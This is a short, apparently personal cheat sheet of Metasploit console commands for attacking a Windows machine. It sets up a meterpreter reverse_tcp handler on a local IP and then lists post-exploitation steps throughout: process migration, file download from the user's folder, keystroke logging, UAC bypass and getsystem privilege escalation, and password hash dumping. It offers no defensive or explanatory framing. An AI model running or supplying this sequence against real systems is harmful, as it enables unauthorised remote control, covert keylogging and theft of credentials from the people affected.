msfconsole
help

search php

search wordpress

search bypassuac

use exploit/windows/local/bypassuac

set session 1

show options

# Start Handler for trojan
# List sessions
session -l
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 5555
exploit -j
sessions -i 1
sysinfo

ps
migrate <pid>
shell
exit
download C:\\users\%username%\\file.txt Downloads/file.txt
ipconfig

# Keylogger
keyscan_start
keyscan_dump # After entering keystrokes on target

# Privilege escalation
getsystem

background
search exploit_suggester
use post/multi/local_exploit_suggester
show options
set SESSION 1
run

search bypassuac
use exploit/windows/local/bypassuac
show options
set SESSION 1
run

use exploit/windows/local/bypassuac_fodhelper
show options
set SESSION 1
run
run # Run again if session not started
getsystem

# Passwords
background
search hashdump

use post/windows/gather/hashdump
show options
set SESSION 1
run
# If NTLM hashes use ntlmdecryptor